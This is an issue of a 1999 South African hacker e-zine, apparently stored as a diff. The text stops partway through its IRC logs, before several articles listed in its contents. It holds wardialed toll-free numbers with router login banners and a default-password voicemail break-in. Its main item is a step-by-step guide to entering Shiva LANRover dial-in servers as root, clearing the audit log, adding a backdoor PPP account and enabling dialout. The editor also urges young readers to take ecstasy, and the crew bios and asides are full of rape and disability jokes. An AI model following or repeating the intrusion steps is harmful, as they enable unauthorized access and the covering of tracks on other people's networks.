@@ -1,0 +1,1708 @@
+                                                        .
+                                                       ::
+                            ,,,__                  __,,;;....
+                            _УУ$$$PPmm,,       ,ЦSSS$$$bb,
+                        ,,$$$$$$$$'''        d$$$P''  '"$$S,
+                      ,$$$ЅЅ''$$$$?;       .$$$"    ...::$$$;...
+                    ,$$$''    ;$$$$$     : i$$:        :::$$$
+                   i$$?       :$$$%%   ;;; I$$; .      :::$$$::::
+                  ;$$P        .$$$$$       '$$$,..       Ц$$;
+                  W$$;         $$$          ,$$$·, __,_,d$$'
+                  Y$$          $$$ ___,,,ssSSP'?S$$$$$$$P'
+                  Z$$          $$$$$$???УУУ'?d$$$`""$$&"$$S,:::
+            ЦЦЦЦ,,E$$          $$$$P''     .$$$"     ;:  $$$;::
+              '''$1$$ЦЦЦ,,__   $$;$$,      i$$::::    ;   $$$::
+             ____;$$$$$$$$;;   $$;'$$$,    I$$;:::   .,   $$$::
+           $$$$УУУ0$$?''       $::  "$$$,  '$$$          Ц$$;::
+                  W$$          $$.    '$$$, '$$$·,    _,d$$'
+                  N$$          $$$      ?$$$,,'?S$$$$$$$P' :
+                  Z$$          $$$        У$$$;;.`""""'    .
+                  me^
+
+                   .-=  Forbidden Knowledge Issue Eight  =-.
+      -=< First Issue we released while sober since Issue Three!@#$% >=-
+
+        [ First Birthday Issue - Released Sunday, 26th December 1999 ]
+
+Yeap, Forbidden Knowledge kicking it into the new millenium, which actually
+technically only starts in 2001, but since the rest of the world is too dumb
+to notice that, we won't notice it either! It's freedom, baby, jeah!@#$%
+
+But before the zine even starts, it's time for a good 30k or so of mindless
+garbage so our zine can be bigger and more bloated to increase of uber-elite
+image! Pheer!
+
+---==< The Usual Shizznitch :P~                          
+
+Active Regular Crew: Wyzewun, Pneuma, Moe1, Cyberphrk and (unofficially, but I
+                     feel silly calling him a guest) Jus
+
+Idle Regular Crew: Vortexia (Gee, how strange :P)
+
+Guest Contributers to this issue: Invisiac, DrSmoke and Sigma
+
+Shout Outz: Blabber.Net's #hack, CoLdBLood, b4b0, DrSmoke, b10z, jus, Sigma,
+            Cruciphux, Cyclotron, kokey, icesk, NtWaK0, Corrupt SYN, Opium,
+            Ultima, Gevil, Timewiz
+
+Fuck Youz: The Spice Girls (d4mn f4t s|utz ST1LL h4v3n't r3sp0nd3d t3w mUh
+           pr0p0z4L 0f n3ts3x0r!@#$ dUmB b1tch3z!@#$%)
+                                            
+Happy Hacking: It sounds like a lame holiday that nobody likes
+
+Engaged: Sniper: We're proud of you, bud - But Shjeesh, we leave you alone for
+         6 months and you go out and become an upstanding citizen - tsk tsk!
+         Oh yah, and Pneuma and I are gonna burn down your house if ya don't
+         invite us to the wedding. ;D
+
+Official FK8 Food: "Chips Ahoy!" Choc Chip Cookies
+Official FK8 Novel: The Great and Secret Show by Clive Barker
+Official FK8 Spokespeople: Smokey the Crackhead and Lord Cthulu                
+Official FK8 Beverage: Anything but Tequila, God, No more Tequila
+Official FK8 Soundtrack: Limp Bizkit, Matchbox 20, Wu-Tang Clan, Rob Zombie,
+                         KoRn, Eminem, Bloodhound Gang, Prodigy
+
+Pointless fact of the month: Prodigy saw Pneuma's dick!@#$
+Yes: I am being serious, but I think you'd be better off without the details
+
+Site of the Month: National Association for Down Syndrome - www.nads.org - HEH
+
+Operating System of Month: QNX <www.qnx.com>
+Not forgetting: OpenBSD, Solaris and good ol' FreeBSD
+
+Tired: Of being 0wned every second fucking day? Do yourself a favour and
+       replace your CGI scripts with Java Servlets, you dumb jerk. :)
+
+,............................................................................,
+|  This e-zine features the words "fuck" and "fuq" a total of 44 times, has  |
+|        5 references to male genetalia and is generally distasteful.        |
+|       											     |
+|                     The verdict? Leetness = 8/10 :-)                       |
+`............................................................................'
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                  Contents of Forbidden Knowledge Issue Eight
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+[-*-] Introduction by that dumb editor du0d :) 
+
+-*-[ Articlez!@#$% 
+
+[-*-] Byteware for this Issue                               
+[-*-] Who the hell are these guys anyway?   
+[-*-] Interesting Wardialling Results
+[-*-] HTTP Basic Authentication explained  
+[-*-] Dialout/PPP on Shiva LANRovers           
+[-*-] Pheered IRC Logz of the Pheered Folk      
+[-*-] A couple of dumb bugs in doze software              
+[-*-] PHEAR Advisory Re: Divine forces (PH-99:01)
+[-*-] Buffer Overflow Explained
+[-*-] Introduction to Assembly Programming      
+[-*-] Fun with "Trojan" Wingates           
+
+-*-[ B0nus k0dez!@#$%
+
+[-*-] Share Password Extractor   
+[-*-] Phoney Ringy Thingy
+[-*-] Pascal F00F Implementation
+[-*-] Guide to Mostly Horny Hooking Part One
+
+[-*-] Farewells (Parting is such sweet sorrow)
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                            Introduction by Wyzewun
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+Werdup Bitchez!@#$%
+
+Yeap, Forbidden Knowledge is back and although we're *still* lame as hell, the
+fact that you *read* this shit must mean that either we're not *that* bad, or
+you're even dumber than we are. Unfortunately, it's more likely to be the
+latter, HEH! :P
+
+Anyway, I have 500 excuses for every mistake in this zine, so wtf should I
+worry. Probably the main reason for me being significantly dumber this issue
+is an awful, awful, AWFUL Mescalin Tequila drinking competition against 
+Corrupt SYN which I lost horribly. And I mean *horribly*. I not only knocked 
+the taps off CS's shower by falling into them, but also fell head first 
+through a porcelain toilet seat. And the stuff I found out about me the next
+morning - GAWD!@#$ Whining "Take me to Vorrrrt" continously when they put me
+in the car to take me to hospital, Being dragged down the stairs by my feet,
+Puking all over CS's sister's room. What I *do* remember is trying to read 
+her e-mail: Fuck me, using Windoze has never been so DIFFICULT. :P~ It took 
+me at least 3 minutes to position the cursor over the message I wanted to 
+read and although I eventually managed to open it, the writing wouldn't 
+keep still and I ended up getting dizzy and falling off the chair headfirst
+into her desk. Oh dear, oh dear, the story just goes on and on - I think 
+I'll spare you the rest of the details. In short though - alcohol is a 
+*stupid* drug. :/ So kidz, take E instead, y0. I have never once had any 
+unpleasant effects on it and the only reasons alcohol is legal are that...
+
+A) The government taxes the bo0ze industry to fuck, and
+B) Half of the planet are dickhead agro alcoholics already :)
+
+Oh well, hope you enjoy this issue. We've come a long way in the past year,
+and I just can't see myself as the same person who wrote FK1. And I'm *glad*
+about that - Gawd, everything about those early issues just SUCKED DICK! :P To
+be completely honest, I don't think theres been an issue that doesn't totally
+suck yet but we may see one in the not-so-distant future. Anyway, To all the 
+people who've read FK from the beginning, To all the people who've mailed in
+their letters of support and To all the people who have contributed articles
+- Thank you. You all rock. Peace Out...
+
+Wyzewun
+
+                                ++--==--++         
+"Well, I was gonna go into IT, but I was looking at how those people in the IT
+mags look the other day and I just thought 'Fuck that, I don't wanna grow up
+to look like THAT.' I'm going to film school in London."
+
+ --- Gevil, when asked by Wyzewun what he was gonna do now that he's finished
+     school. We wish ya the best of luck, G, we're gonna miss ya. :)
+                                ++--==--++         
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                            Byteware for this Issue
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+I have started the byteware coloumn as a place to store hints and tips, rants,
+thoughts, articles not big enuff or too weird to make other parts of the zine
+and other junk that we just happen to feel like putting here. Enjoy! ;)
+
+
+Byteware from Pneuma...
+~~~~~~~~~~~~~~~~~~~~~~~
+Should you phone (011) 482-8292 you will hear a recording of some-one saying
+something to the effect of "Such and Such a publishers have moved, thanks for
+calling" followed by a few tones. This is not what it seems. Ever seen a
+Johannesburg payphone refusing to be used because it's "Reporting"? Well, this
+is the number it calls when doing those reports so you may very well find
+something quite interesting there. <efg>
+
+
+Byteware from Wyzewun...
+~~~~~~~~~~~~~~~~~~~~~~~~
+Members of the X-Stream Network <www.x-stream.co.za/www.x-stream.com> can 
+simply refuse cookies from ads.x-stream.co.za or the server relevant to their
+country to cause the Advertisement program to crash and die horribly. There 
+you go - a free ISP with no annoying adverts. =)
+
+-----------------------------------------------------------------------------
+Thanks for tsilik for pointing out that the binary of keylog.exe as
+distributed with last issue did not work on faster processers. This is due to
+a bug in TP's CRT library and although he gave me a place to find a patch - I
+can't remember the URL. :P Ehehe, anyway, if your TP doesn't have the patch
+then just get rid of the "uses Crt" and the "clrscr" statements and it will
+work like a charm once again. :> A fixed binary version will be made available
+sometime somewhere. ;P
+
+-----------------------------------------------------------------------------
+A big "WELL DONE!" goes out to Telkom for "fixing" Identicall on pulse
+exchanges. Now, instead of only getting the first 3 characters of the number,
+you get the first 5... of a 7 digit phone number. *Sigh* I don't know if
+Telkom are *completely* incompetent, if they sniff too much cocaine, or if
+they think that because they have a monopoly they can be as shit as they want.
+Regardless, their attempt to incorporate Identicall into the older exchanges
+didn't work, so folks, we *still* have our anonymity for when the new law
+comes in. :) What new law you say? Read on...
+
+-----------------------------------------------------------------------------
+Time is running out HaX0r kiddies - as of January 1st 2000: hacking is illegal
+in South Africa. :( And, yes, if you mail us and ask, we will send printed
+copies of FK to your jail cell whenever we release them. We will, of course,
+rip you off constantly for being there, but it's a small price to pay to get 
+your thoughts off how sore your butt is for a while, heh. =)
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+               "Who the hell are these guys anyway?" by Wyzewun
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+Lately, we have been getting a lot of questions like "Who/What exactly are the
+Forbidden Knowledge crew?" and "Can I join?" and so, I saw it apt to write
+this article - a quick explanation of exactly who and what the Forbidden
+Knowledge Production team are, to prevent us from getting further really
+stupid mail. And believe me, I have gotten a *LOT* of stupid mail lately. :)
+
+First off: we are not a "crew" - we are just a bunch of friends who make a
+zine together because we hope that it will increase our chances of getting
+laid more often. :P For this reason - you cannot "join" because there isn't
+anything *to* join. However, you are more than welcome to send articles - it
+makes my life a lot easier when I get a decent amount of contributions and
+nobody loves me enough to give me articles most of the time. :(
+
+Now... Who are we? Hmm... I'd better go through this systematically...
+
+Wyzewun is a 16 year-old luzer about to start his final year of high school.
+Although he has never *actually* raped a goat, he confirms that should he had
+ever had access to a goat at a convenient time, or should a reader donate him
+a goat, that may change. He has been seeing a psychologist on-and-off for
+nearly three years... He is *still* not cured.
+
+Pneuma is a 17 year-old German immigrant who is also about to start his final
+year of high school. We suspect that he is secretly Bill Gates' love-child,
+and Pneuma himself confirms that he too suspects this. We have sent several
+plea's to Mr Gates to send him maintenance, but have recieved no responses as
+of yet. We will continue trying.
+
+Vortexia is a 21 year-old firewall programmer and security consultant. Despite
+being a multi-millionaire, he is the stingiest man on earth... right down to
+being stingy with article submissions. He spends his spare time bragging about
+how leet he is on IRC, as if people were actually listening to him. I would
+also like to note that of all the rich people I know, Vortexia has the least
+sense for personal hygeine. Yeap, he's a crazy-ass warez-kiddie bum... but we
+love him anyway. :)
+
+Moe1 is an 18 year-old who has just finished school and who (strangely enough)
+we have never actually met. :P We will probably meeting him for the first time 
+sometime early next year. He's the *only* person other than myself who 
+contributes on a regular basis: without him keeping FK going would be a lot 
+more difficult. Of course, we have to make rumours that he rapes children so 
+he, y'know, fits in with the posse. :P
+
+Cyberphreak is a 16-year old nutcase who we are convinced is secretly a crazed
+monk with some or other diabolical plan to take over the world. Despite our
+many attempts to provoke information out of him such as where he lives, so we
+can capture him for study, we have been unsuccessful so far. We enjoy his
+company, mentally unstable as he may be, due to the fact that he makes Pneuma
+and I feel almost normal. He's still going to have to rape many more goats and
+bang his head against the wall many more times before he can rival us though.
+
+And that... is the Forbidden Knowledge production team, why you should walk to
+the other side of the road if you see us, and why you can stop mailing us
+stupid questions. Goodnight...
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                     Wardial results from Wyzewun and Moe1
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+Carriers from Wyzewun...
+
+-----------------------------------------------------------------------------
+0800116603 
+-----------------------------------------------------------------------------
+08002248600
+
+.------------------------------------------------------------------------.
+|                  South African Internet Exchange                       |
+|                                                                        |
+|  DNS: 196.25.1.1    NEWS: news.saix.net    WWW: http://www.saix.net    |
+|                                                                        |
+|             National Telematix Help Center: 0800222233                 |
+|                                                                        |
+|                SAIX test PoP - NOT FOR PUBLIC USE                      |
+| for36-01                                                               |
+`------------------------------------------------------------------------'
+
+
+
+User Access Verification
+
+Username:
+-----------------------------------------------------------------------------
+
+Carriers and other interesting stuff from Moe1...
+
+-----------------------------------------------------------------------------
+0800005064 
+             /\                               ||        ||
+            /__\                              ||        ||
+           /\  /\                            ||||      ||||
+          /__\/__\                       ..:||||||:..:||||||:..
+          DIMENSION                     C I S C O  S Y S T E M S
+          -----DATA
+                          Omnidial_JHB
+
+
+User Access Verification
+
+Username:
+-----------------------------------------------------------------------------
+0800003350
+
+                               *
+                             ****       *
+                          ********       ***
+                      ************      *****
+                    *************     *******
+                   *************       ********
+                   **************       **********
+            *       ***************       ***********
+              **      ****************     *************          *
+               *****     **************   ****************     ***
+              ********      *********** *******************  *****
+             **********       ****************************   *****
+         ************          ***********************        ******
+       *************          ********************           **********
+      *********************************************      ***************
+       ****************************************************************
+          ***********************************************************
+
+             L I B E R T Y    L I F E    I N T E R - N E T W O R K
+
+
+         YOU ARE NOW LOGGED INTO THE LIBRIDGE CISCO 3600 ROUTER 8 (LB_8)
+
+
+
+User Access Verification
+
+Username:
+-----------------------------------------------------------------------------
+0800006000
+
+             /\                               ||        ||
+            /__\                              ||        ||
+           /\  /\                            ||||      ||||
+          /__\/__\                       ..:||||||:..:||||||:..
+          DIMENSION                     C I S C O  S Y S T E M S
+          -----DATA
+                          Omnidial_JHB
+
+User Access Verification
+
+Username:
+-----------------------------------------------------------------------------
+0800005027
+-----------------------------------------------------------------------------
+0800001760
+-----------------------------------------------------------------------------
+0800116063
+-----------------------------------------------------------------------------
+
+blah blah enuff carriers
+This is summing for de chiqz out there, u cant say FK doesn't care for you too
+
+now:
+dial 0800004330 (wiff your fone not your modem slut!)
+after u connected:
+press 4
+den press 5
+den press 7
+den press 1111
+
+;D
+
+And now for the SMI voicemailbox hack from Moe1
+-----------------------------------------------
+                     
+dial
+0800001570
+then
+press 1
+extension: 001 (end with '*')
+password: 1234 (end with '*') [default password should work with other
+extensions too]
+Owner Main Menu.
+Enjoy!
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                HTTP Basic Authentication explained by Wyzewun
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+If you have ever had an experience where your browser has popped up a window
+containing a message something to the effect of...
+
+Username and Password Required
+Enter username for secret-pr0n-archive at www.posthuman.za.net
+
+... then you have come into contact with a server that uses HTTP Basic
+Authentication. This is probably the most common method of protecting access
+to non-public documents on webservers and works exactly the same way on all
+webservers. Also note that my example banner is from Netscape - other browsers
+will vary - but the idea remains the same. Just make sure not to get confused
+between this and other fake "authentication" systems like Javascripts that go
+to whatever directory is given to them as a password.
+
+Basically, we know a server is using this scheme if we get a HTTP error 401
+when we give the wrong password, or don't supply one. So if when trying to
+access http://www.posthuman.za.net/pr0n you get an error 401 you know you
+need a l/p to access it. Okay, so we know we can't access Post-Human's neato
+Goat Porn archive. But if we could, what would the request look like?
+
+GET /pr0n HTTP/1.1
+Authorization: Basic mNsJQw2jAJDSlDsdsh==
+
+So should we pick this up in our sniffer logs, its useless, coz it's encrypted
+right? Errr... Nope. That's Base64 encoding, not encryption, duh. :) All we
+need to do to decode this is a little bit of perl like this...
+
+use MIME::Base64;
+print decode_base64("mNsJQw2jAJDSlDsdsh==");
+
+Oh, and if ya don't have the MIME::Base64 module you can download it from
+http://www.perl.com/CPAN - it's used for e-mail handling stuff, but can prove
+useful for causes such as this one. :) Anyway, when decoding that we see it
+really said "ghay.juzer:eyeyamsoleet" - that being the username, followed by a
+colon, and then password. In plain text!
+
+So we know that HTTP Basic Authentication offers no real security, but perhaps
+we want to implement it for something which a fairly low amount of security
+will do for, or for something to do on a rainy day just to see how it's done.
+So this is how to set it up under Apache...
+
+First off, we need to create a password file. We do that using the htpasswd
+command like so...
+
+[admin@kung-fusion]# htpasswd -c /etc/httpd/conf/passwh0rdz
+
+We then add users to it like so...
+
+[admin@kung-fusion]# htpasswd /etc/httpd/conf/passwh0rdz ghay.juzer
+
+Then you will be prompted to enter the chosen password for ghay.juzer twice,
+and the results will be stored in /etc/httpd/conf/passwh0rdz like so...
+
+ghay.juzer:tM0.PnhfVy76k
+
+Btw, in case ya can't see - thats DES encryption over there. That file is also
+world readable, so it may cause you a bit of hassle if you don't set up Basic
+HTTP Authentication correctly. What I mean by that is make sure there are *no*
+common passwords, and preferably, no common usernames either between these
+users and people with shell accounts, access to your FTP daemon etc.
+
+Anyway, so we now have a password file, and we need to setup the directory to
+protect. So we edit a line like this into /etc/httpd/conf/srm.conf
+
+<Directory /home/httpd/www.posthuman.za.net/pr0n>
+  AuthType Basic
+  AuthName secret-pr0n-archive
+  AuthUserFile /etc/httpd/conf/passwh0rdz
+  require valid-user
+</Directory>
+
+The AuthName is what gave the name to the Netscape banner I showed you at the
+beginning of this article. AuthType is Basic (as oppossed to other, more
+secure authentication methods like "Digest" which are great but haven't been
+implemented by any browsers yet.) AuthUserFile is where our passwd file is.
+And instead of "require valid-user", we could limit access to this directory
+to only certain users in the passwd file. So in a passwd file containing
+ghay.juzer, jhaypee, warez.mastah and seckzdonkey, we could say...
+
+  require ghay.juzer warez.master seckzdonkey
+
+..so that jhaypee could not steal our z3r0-d4y k0d3z even though we put him
+in the passwd file!@#$ Phj34r!@#$ :P
+
+I would include how to do this under IIS5 as well but I don't have NT yet. :(
+Maybe I'll get a nice big fan, overclock my Celeron 300A to 450 or something 
+similarly insane, chuck in another 32MB of RAM so I have 64MB, and then 
+dual-boot NT5 and Solaris x86 on it. That would be nice, because I really 
+need to start playing with NT locally more often and because Solaris is just 
+plain elite - especially if I'm going to be playing with Java. Hmm, NT5 will
+probably be quite a bitch though, coz although it's more stable than 9x, it
+wants decent hardware. :( Oh well, I'll just give it a shot, and if it runs
+like shit - it'll just have to come off again. Heh, I'll probably end up just
+sticking with fBSD 3.3 and *shudder* Win98.
+
+I'm digressing badly here, and the article is basically finished. :) Anyway,
+that was, in a nutshell, HTTP Basic Authentication, why it sucks, and how you
+can have it if you want it anyway. Hope it was of some use to you...
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+       Ultra-Mini Gay HOWTO - Dialout/PPP on Shiva LANRovers by DrSmoke
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+First thing you do is get out wardialer and scan for 0800's until you find
+a shiva, if you can't do this, you suck. Once scanned you can try user: root
+pass: <nopass>, 9 times out of 10 this will work. [ You will recognize a Shiva
+by the @ Userid: prompt - Ed] The reason that the root account works alot is
+beacuse in some cases the admin is not even aware the account even exists!
+Most of the system setup is done via the main terminal, so the admin doesn't
+have to login.
+
+Like most OS's, Shiva systems have an audit log, so don't sit there trying to
+brute force anything, once you are in, you can clear the system log,
+"clear log" - requires root, of course.
+
+A lot of the time you can get in and try run ppp but it says "Not authorized
+to use PPP" reason being that you need to state that PPP is enabled when
+adding a user.
+
+show security <enter> (this gives a list of the security configuration and the
+user list.) you should see somthing like this:
+
+[UserOptions]
+PWAttempts=0
+ARARoamingDelimiter=@
+ExpireDays=30
+GraceLogins=6
+
+[Users]
+admin=/di/do/rt/pw/sh/pwd=hH8FU4gBxJNMMRQ0yhj5ILUbaS/ml=3/fail=1/time=425
+jsmith=/di/pw/pwd=.b9BJFBhuA1vuqFa9s8KBlxmngZ/ml=2/time=897646052
+mjones=/di/pw/pwd=kRaOhlyT7CKMBldLVBVbektbCE/ml=2/fail=5/time=897646052
+user911=/di/pw/pwd=7Xkq8TOwB4juRI51OHkDVVos8S/ml=2/time=910919159
+
+The passwords in the external user list are all 3DES (triple DES) encrypted.
+The type of user account set up is determined by the options, such as
+jsmith=/di/do etc. To add a user we need to enter the configuration setup in
+the command line ...
+
+type: ShivaLanRover/8E# config <enter>
+
+You will then drop into the configuration session.
+
+Enter configuration file lines.  Edit using:
+^X, ^U      clear line
+^H, DEL     delete one character
+^W          delete one word
+^R          retype line
+
+Start by entering section header in square brackets []
+Finish by entering ^D or ^Z on a new line.
+
+config> (here is where you enter the config commands, to make you own
+account
+do the follwing)
+
+config> [users]
+config> username=/di/do/sh/tp/pw
+config> ^D <------ (type control D to finish)
+
+
+Review configuration changes [y/n]? y
+New configuration parameters:
+[users]
+username=/di/do/sh/tp/pw
+Modify the existing configuration [y/n]? y
+You may need to reboot for all changed parameters to take effect.
+
+You've just created your own user account which you can use for PPP.
+
+okay, enough on PPP, now time for Dialout - w00h
+
+if system has dialout disabled and you have root, just enable it like so:
+
+enter configuration like I showed you above and do
+
+[DialOut]
+Enabled=1
+^D
+
+reboot, and DialOut should be enabled.  You can see if it is enabled by "show
+configuration" should say Enabled=1, Enabled=0 means its disabled.
+
+MAGIC INFO
+----------
+
+Okay, so you've setup Dialout and you using it, but you get disconnected after
+20 seconds?!?! The reason behind this is that the pppd string contains one or
+two disconnect chars and it disconnects you (I think)
+
+to fix just add these two lines to /etc/ppp/options:
+
+escape 0x1e,0x9e
+asyncmap 0
+
+I've also added a chat script example, to make your life a bit easier ...
+
+- snip snip -
+
+# Setup modem
+ABORT BUSY ABORT "NO CARRIER" ABORT VOICE ABORT "NO DIALTONE" ABORT "NO ANSWER"
+# Dial shiva (send \r\r after delay to start login process)
+"" ATZ
+# Put your favourite shiva here
+OK ATDT0800xxxxxx
+CONNECT \d\r\r
+# If the userid doesn't appear, send the \r\r again. 
+# Change login/pass as needed
+Userid:-\d\r\r-Userid: root\p\p
+assword? \r\d\d\r\r\r
+# If you aren't root, you'll get a > rather than a # prompt.
+# all_ports should work, but you can change it do "dialout" or so.
+"#-\r\r\r-#" "connect all_ports\r"
+# Insert your real chatscript here.
+# (This one is for demon)
+#"" ATZ OK ATDT08452121666 CONNECT ''
+#ogin: \d\qUSERNAME ssword: \qPASSWORD ocol: ppp HELLO ""
+# (And this one for BTi)
+"" ATZ OK ATDT08450884100 CONNECT '' 
+ogin: \d\qUSERNAME ssword: \qPASSWORD
+
+- snip snip -
+
+have phun, yo
+jakes@leet.org 
+
+DrSmoke/Jakes@IRC
+Thanks to b4b0 for some info I used in this article.
+
+[ Epilogue by Wyzewun: 
+
+  Whenever attempting to break into a Shiva LANRover, always keep your left
+  hand held upwards with the palm open in the Abhaya (Fear Not) Mudra as it
+  is much beloved by Shiva. Wait... this is hacking, not Tantra. Doh! ]
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                     Pheered IRC Logz of the Pheered Folk
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+---// Pheered log of Wyzewun giving Vortexia Pheered PC Advice
+
+<Vortexia> *CRYYYYYYYYYYYYYYYYYYYYYYYY*
+<Vortexia> *SCREAMMMMMMMMMMMMMMMMMMMMMMMM*
+<Vortexia> *DIESSSSS*
+<Vortexia> NOTHING IS FUCKING WORKING
+<Vortexia> oh god what a fuckup
+<wyze1> vortexia: have you tried giving it love and understanding?!!!
+<wyze1> maybe your computer just needs a HUG damnit!!!!
+<wyze1> you never think about ITS needs!!
+<Vortexia> wyze1 FUCK OFF I don't need your fucking shit right now
+<Sorceror> heh
+<wyze1> HEH
+<Vortexia> my fucking 50gig raid news server is down
+<Vortexia> my fucking personal box with 50gigs of my data on it is down
+<Vortexia> and I accidently rebooted my irc server and lost my max user count
+<Vortexia> DO I SOUND LIKE I NEED FUCKING SHIT RIGHT NOW
+<wyze1> no, you sound like you need a BIG HUG
+<Vortexia> AND THIS FUCKING CUNT WHORE MANAGEMENT SYSTEM WITH 48 FUCKING PCS
+CONNECTED TO IT IS PISSING ME THE FUCK OFF CAUSE I KEEP FORGETTING WHAT
+BUTTONS TO PUSH TO BRING UP WHAT PC
+р Vortexia screams
+щнщ MH [MH@pc95.vl1.und.ac.za] has joined #hack
+<Vortexia> wyze1 get off your drugs
+<wyze1> try TALKING to it first
+<MH> heh..lo ppls
+<Sorceror> fuck
+<Sorceror> wyze1: are u dumb?
+<wyze1> or perhaps your server's chi is being blocked
+<wyze1> is your feng shui correct?
+<Sorceror> computer's don't like being talked to
+<Sorceror> it pisses them off
+
+---// Pheered log of the type of Pheered people who join us in #hack
+
+*** Now talking in #hack
+N> Join synched in 0.155 seconds.
+  .-------------------------------------------------------.
+  | Topic: Root an Aussie sports server today             |
+  | SetBy: Hitsquad   Tue, Nov 02 1999 at 12:36pm         |
+  '-------------------------------------------------------'
+N> [o: 10][v: 1][n: 4][t: 15][m: +tnrR]
+#hack created on Wed Sep 22 06:25:19
+<jus> u meqan..a cracker?
+<jus> cracking linux..explain?
+<Vortexia> idiot customers
+<jus> crack an open source kernel?
+<esteban> crack and rewrite the kernel to make it more stable and harder to
+hack
+*** Quits: Chiq (Connection reset by peer)
+<esteban> networks in sa are 2 easy
+<jus> heh
+*** Joins: Chiq (andi@196.7.80.34)
+<esteban> a firewall here u nuke and then port sniff when it comes up again
+and u have access if u know port surfing
+<jus> 'nuke' a firewall...
+<Jolub> esteban if you re write a 72mg linux kernel... i'll buy you a case of
+beer and one hooch
+<esteban> use winnuke,supernuke,master_jacks_nuker
+<jus> BWAHAHAHAHAHAHAHAHAHAH
+<jus> ok ur too amusing
+<esteban> send a million port requests (almost like flooding)
+<esteban> and it resets to avoid a crash
+<jus> heh
+<jus> a cisco pix would nefver give way mate:)
+<PhreakAzoid> l0l
+<jus> my firewalls never est
+<jus> because they are ....stable.
+<jus> reset even.
+<esteban> try sending 5 nukes from different isdn's and it will
+<jus> if u think that it is so easy, then go ahead and try security.za.net :)
+<esteban> me and my buddies all gather at one place and nuke all at once for
+best effect
+<jus> hahahahahahahahahah
+<PhreakAzoid> what are we watching .. sout africa's funniest IRC pranks ?
+<KnightMarE> lol
+<esteban> have u tried back orifice 2000 yet
+<Jolub> something like that PhreakAzoid
+<jus> BWAHAHAHAHAHAHAHAHAHHA
+<jus> back fscking orifice can bite me
+<esteban> and unix has back door accounts that no-one knows of
+*** Joins: cyclone (cycl0ne@vortex.citec.net)
+*** ChanServ sets mode: +o cyclone
+<jus> cyclone:)
+<jus> esteban: ok, u can stop talking shit now.
+<esteban> and most big companies run windick 
+<cyclone> hiya jus :)
+<jus> pls, go ahead..security.za.net is a freebsd unix machine
+<cyclone> hehe.. i'd like to see u try r00t *that* box
+*** MIndTrance is now known as MindTrance
+<jus> hehehe
+<jus> secret accounts....hahahahah
+<jus> i've gone through the entire system sorce code
+<esteban> The root password on it is - unsecure - try it as a login it works 
+<jus> BWAHAHAHAHAHAHAHHA
+<cyclone> HEHEHEHEHE
+* acid starts giggling
+<esteban> try hex editing - youll be amazed at the hidden things in unix that
+can screw up your system
+<acid> BWAHAHAHAHAH!!!!!!!
+<acid> BWAHAHAHAHAH!!!!!!!
+<esteban> anyway - who here cracks
+<acid> esteban:LOL
+<acid> yeah dude
+<jus> acid: amusing huh:)
+<acid> hex c code
+<acid> fuck
+<acid> that'll work
+<acid> LOL WBAHAHahahaha
+<acid> esteban: yeah i crack
+<jus> BWAHAHAHAHAHAHAHAHAHAHHAHHA
+<PhreakAzoid> esteBAN him now ;P
+<acid> but i dont do lame mIRC hex editing
+<acid> nooit
+<acid> lets keep him
+<jus> esteban: freebsd unix was rated by ServerWatch as the best netserver OS
+around because of its high security and fast tcp/ip stack
+<esteban> i agree - but nothing is hack proof
+<esteban> try look for hack-net on altavista
+<Vortexia> esteban rewrite muh trusted bsd kernel
+<Vortexia> :P
+<jus> *snort*
+<Vortexia> I wanna see you do it
+<Vortexia> *SNORT*
+<esteban> and go to the hackers recourse centre and look for exploits there
+<acid> esteban: LOL
+<acid> oh gawd
+<Vortexia> esteban you are a real fucking idiot arent you?
+* acid starts hosing
+<jus> esteban: given, not hack proof..but the amount of time taken to hack
+certain machines..heh..give oor  take a few billion years
+<Vortexia> god get a clue
+<acid> someone gimme a nappy
+<jus> BWAHAHAHAHAHHAHAHAHAHAH i've never laffed so much
+* acid throws esteban a brain
+<acid> how old are you esteban?
+<jus> esteban: do u know who is in this channeL? ZA's best and only security
+consultants
+<esteban> acid - what source would a windows 2000 serial number be under ????
+<PhreakAzoid> esteban you read some texts now you got it all mixed up huh ?
+<Vortexia> esteban sounds like gov-boi 2
+<Vortexia> :P
+<cyclone> LOL
+<jus> hehe
+*** esteban was kicked by Vortexia (clueless newbies do not belong, please
+leave)
+*** Joins: esteban (Shadow@vic-dial-196-30-235-48.mweb.co.za)
